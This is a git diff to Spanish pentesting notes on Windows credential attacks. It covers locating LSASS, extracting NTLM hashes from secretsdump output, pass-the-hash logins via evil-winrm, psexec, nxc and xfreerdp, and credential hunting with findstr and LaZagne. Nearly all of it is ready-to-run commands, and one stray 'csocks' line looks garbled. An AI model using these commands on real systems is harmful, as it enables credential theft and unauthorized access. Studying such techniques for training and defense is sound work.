@@ -43,7 +43,7 @@ Se puede obtener información como la que sigue:
 1. Encontrar el PID de LSASS:
    - Con `cmd`:
      ```cmd
-     tasklist /svc
+     tasklist /svc | findstr lsass
      ```
    - Con PowerShell:
      ```powershell
@@ -103,7 +103,10 @@ Puede tener sentido para reutilizar contraseñas posteriormente en otros servici
 ### Extraer NTLM hashes de `secretsdump.txt`
 Suponiendo que el archivo `secretsdump.txt` es
 ```bash
-grep -oP '(?<=aad3b435b51404eeaad3b435b51404ee:)[a-f0-9]{32}' secretsdump.txt > hashes.txt
+#Todos los hashes
+grep -oP '(?<=aad3b435b51404eeaad3b435b51404ee:)[a-f0-9]{32}' secretsdump.txt > hashes.txt 
+# hash de Administrator sin salto de línea al final
+cat secretsdump.txt| grep Administrator | grep -oP '(?<=aad3b435b51404eeaad3b435b51404ee:)[a-f0-9]{32}' | tr -d '\n'> hashAdmin
 ```
 
 ### Fuerza bruta con `hashcat`
@@ -129,7 +132,7 @@ En la práctica, como comando se puede envíar una revshell en powershell de [re
 evil-winrm -i $target -u Administrator -H <NTLM_hash>
 ```
 
-#### Con `impacket-psexec`
+#### Con `impacket-psexec` - SMB
 ```bash
 impacket-psexec administrator@$target -hashes :<NTLM_hash>
 ```
@@ -140,7 +143,7 @@ nxc smb $target -u Administrator -H <NTLM_hash> -x "whoami"
 ```
 #### Con `xfreerdp`
 ```bash
-evil-winrm -i $target -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+xfreerdp  /v:$target /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 ```
 Esto normalmente no funcionará, ya que por defecto hay un `Restricted Admin Mode` habilitado. 
 ##### Habilitar `Restricted admin mode`
@@ -375,12 +378,20 @@ xfreerdp /v:DC01
 ## Credential Hunting en Windows
 
 ### Buscar Credenciales en Archivos
-```
+```cmd
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+findstr /s /i cred n:\*.*
+# powershell
+Get-ChildItem -Recurse -Path n:\ | Select-String "cred" -List
 ```
-
+### Buscar archivos que puedan contener credenciales
+```cmd
+dir n:\*cred* /s /b 
+# ó en powershell
+csocks
+```
 ### Con `LaZagne`
-```
+```cmd
 C:\tools> lazagne.exe all
 ```
 
